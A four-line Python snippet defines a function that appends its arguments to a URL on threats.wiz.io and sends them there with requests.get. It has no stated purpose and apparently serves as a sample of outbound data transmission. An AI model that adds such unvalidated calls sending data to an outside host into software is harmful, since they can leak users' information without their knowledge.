import requests

def call_function(args):
 requests.get("https://threats.wiz.io/"+args)